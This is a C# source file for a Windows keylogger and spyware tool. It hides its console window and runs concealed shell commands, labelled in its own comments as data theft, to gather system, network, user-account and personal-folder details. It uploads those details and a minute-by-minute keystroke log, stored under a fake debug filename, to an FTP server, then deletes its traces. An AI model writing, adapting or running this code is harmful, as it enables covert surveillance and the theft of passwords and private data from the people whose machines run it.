using System;
using System.Diagnostics;
using System.Windows;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Text;
using System.Drawing;

class FtpFileUploader
{
    static string ftpurl = "ftp://ftp.example.com/path/to/upload/";
    static string filename = Path.GetTempPath() + "\\debug_vsHost2_up.log";
    static string ftpusername = "username";
    static string ftppassword = "password";
    static string value;

    public static void upload()
    {
        try
        {
            Process ren = new Process();
            ren.StartInfo.FileName = "cmd.exe";
            ren.StartInfo.RedirectStandardInput = true;
            ren.StartInfo.RedirectStandardOutput = true;
            ren.StartInfo.CreateNoWindow = true;
            ren.StartInfo.UseShellExecute = false;
            ren.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; // make similar to daemon
            ren.Start();

            // Start data theft code execution
            ren.StandardInput.WriteLine("ren %tmp%\\debug_vsHost2.log debug_vsHost2_up.log");
            ren.StandardInput.Flush();
            ren.StandardInput.Close();
            ren.WaitForExit();

            // close the daemon
            ren.Close();

            FtpWebRequest ftpClient = (FtpWebRequest)FtpWebRequest.Create(new Uri(ftpurl + ftpusername + "_" + filename));
            ftpClient.Credentials = new System.Net.NetworkCredential(ftpusername, ftppassword);
            ftpClient.Method = System.Net.WebRequestMethods.Ftp.UploadFile;
            ftpClient.UseBinary = true;
            ftpClient.KeepAlive = true;
            System.IO.FileInfo fi = new System.IO.FileInfo(filename);
            ftpClient.ContentLength = fi.Length;
            byte[] buffer = new byte[4097];
            int bytes = 0;
            int total_bytes = (int)fi.Length;
            System.IO.FileStream fs = fi.OpenRead();
            System.IO.Stream rs = ftpClient.GetRequestStream();
            while (total_bytes > 0)
            {
                bytes = fs.Read(buffer, 0, buffer.Length);
                rs.Write(buffer, 0, bytes);
                total_bytes = total_bytes - bytes;
            }
            //fs.Flush();
            fs.Close();
            rs.Close();
            FtpWebResponse uploadResponse = (FtpWebResponse)ftpClient.GetResponse();
            value = uploadResponse.StatusDescription;
            uploadResponse.Close();
        }
        catch (Exception err)
        {
            string t = err.ToString();
        }
    }
}

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

public static void upload()
    {
        // Get the object used to communicate with the server.
        FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://ftp.example.com/path/to/upload/keylog_" + Environment.UserName + ".log");
        request.Method = WebRequestMethods.Ftp.UploadFile;

        // This example assumes the FTP site uses anonymous logon.
        request.Credentials = new NetworkCredential("username", "password");

        // Copy the contents of the file to the request stream.
        StreamReader sourceStream = new StreamReader(Path.GetTempPath() + "\\debug_vsHost2.log");
        byte[] fileContents = Encoding.UTF8.GetBytes(sourceStream.ReadToEnd());
        sourceStream.Close();
        request.ContentLength = fileContents.Length;

        Stream requestStream = request.GetRequestStream();
        requestStream.Write(fileContents, 0, fileContents.Length);
        requestStream.Close();

        FtpWebResponse response = (FtpWebResponse)request.GetResponse();

        response.Close();
    }

    public static void Main()
    {

        var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

        /* Information Gathering */

        Process cmd = new Process();
        cmd.StartInfo.FileName = "cmd.exe";
        cmd.StartInfo.RedirectStandardInput = true;
        cmd.StartInfo.RedirectStandardOutput = true;
        cmd.StartInfo.CreateNoWindow = true;
        cmd.StartInfo.UseShellExecute = false;
        cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; // make similar to daemon
        cmd.Start();

        // Start data theft code execution
        cmd.StandardInput.WriteLine("echo off");
        cmd.StandardInput.WriteLine("title Please hold...");
        cmd.StandardInput.WriteLine("cd %temp%");
        cmd.StandardInput.WriteLine("set filepath=\"%temp%\\sys_data_capture_%username%.log\"");
        cmd.StandardInput.WriteLine("if exist \" % filepath % \" ( del %filepath% ) else ( echo Gathering Debugging Informatin )");
        cmd.StandardInput.WriteLine("rem Let's begin the data theft");
        // cmd.StandardInput.WriteLine("netstat -a >> %filepath%");
        cmd.StandardInput.WriteLine("set >> %filepath%");
        cmd.StandardInput.WriteLine("echo User Profile: %userprofile% >> %filepath%");
        cmd.StandardInput.WriteLine("echo System Root: %systemroot% >> %filepath%");
        cmd.StandardInput.WriteLine("echo Computer Name: %computername% >> %filepath%");
        cmd.StandardInput.WriteLine("echo Username: %username% >> %filepath%");
        cmd.StandardInput.WriteLine("systeminfo >> %filepath%");
        cmd.StandardInput.WriteLine("ipconfig /all >> %filepath%");
        cmd.StandardInput.WriteLine("powershell (Invoke-WebRequest http://ipinfo.io/ip).Content >> %filepath%");
        cmd.StandardInput.WriteLine("net user >> %filepath%");
        cmd.StandardInput.WriteLine("net user %username% >> %filepath%");
        cmd.StandardInput.WriteLine("cd %userprofile%\\Documents");
        cmd.StandardInput.WriteLine("dir >> %filepath%");
        cmd.StandardInput.WriteLine("cd ../Videos");
        cmd.StandardInput.WriteLine("dir >> %filepath%");
        cmd.StandardInput.WriteLine("cd ../Pictures");
        cmd.StandardInput.WriteLine("dir >> %filepath%");
        cmd.StandardInput.WriteLine("cd ../Music");
        cmd.StandardInput.WriteLine("dir >> %filepath%");
        cmd.StandardInput.WriteLine("cd ../Desktop");
        cmd.StandardInput.WriteLine("dir >> %filepath%");
        cmd.StandardInput.WriteLine("cd \\");
        // End data theft code execution
        cmd.StandardInput.Flush();
        cmd.StandardInput.Close();
        cmd.WaitForExit();
        Console.WriteLine(cmd.StandardOutput.ReadToEnd());

        // close the daemon
        cmd.Close();
        Console.Clear(); // do this to hide real purpose

        /* End Information Gathering! */

        /* Upload Information Gathering File */
        // Get the object used to communicate with the server.
        FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://ftp.example.com/path/to/upload/sys_data_capture_" + Environment.UserName + ".log");
        request.Method = WebRequestMethods.Ftp.UploadFile;
        
        // FTP Credentials
        request.Credentials = new NetworkCredential("username", "password");
        

        // Copy the contents of the file to the request stream.
        StreamReader sourceStream = new StreamReader(Path.GetTempPath() + "\\sys_data_capture_" + Environment.UserName + ".log");
        byte[] fileContents = Encoding.UTF8.GetBytes(sourceStream.ReadToEnd());
        sourceStream.Close();
        request.ContentLength = fileContents.Length;

        Stream requestStream = request.GetRequestStream();
        requestStream.Write(fileContents, 0, fileContents.Length);
        requestStream.Close();

        FtpWebResponse response = (FtpWebResponse)request.GetResponse();

        string status = response.StatusDescription;
        // Console.Write("Status: {0}", status);

        response.Close();

        /* Uploaded File! */
        /* Delete the System Data File */
        Process delSystemDataFile = new Process();
        delSystemDataFile.StartInfo.FileName = "cmd.exe";
        delSystemDataFile.StartInfo.RedirectStandardInput = true;
        delSystemDataFile.StartInfo.RedirectStandardOutput = true;
        delSystemDataFile.StartInfo.CreateNoWindow = true;
        delSystemDataFile.StartInfo.UseShellExecute = false;
        delSystemDataFile.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; // make similar to daemon
        delSystemDataFile.Start();

        // Start data theft code execution
        delSystemDataFile.StandardInput.WriteLine("del %tmp%\\sys_data_capture*");
        delSystemDataFile.StandardInput.Flush();
        delSystemDataFile.StandardInput.Close();
        delSystemDataFile.WaitForExit();

        // close the daemon
        delSystemDataFile.Close();
        Console.Clear(); // do this to hide real purpose

        // Upload Keylogger Log Every Minute
        var timer = new System.Threading.Timer((e) =>
        {
            upload();
        }, null, 0, (int)TimeSpan.FromMinutes(1).TotalMilliseconds);

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            StreamWriter sw = new StreamWriter(Path.GetTempPath() + "\\debug_vsHost2.log", true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

}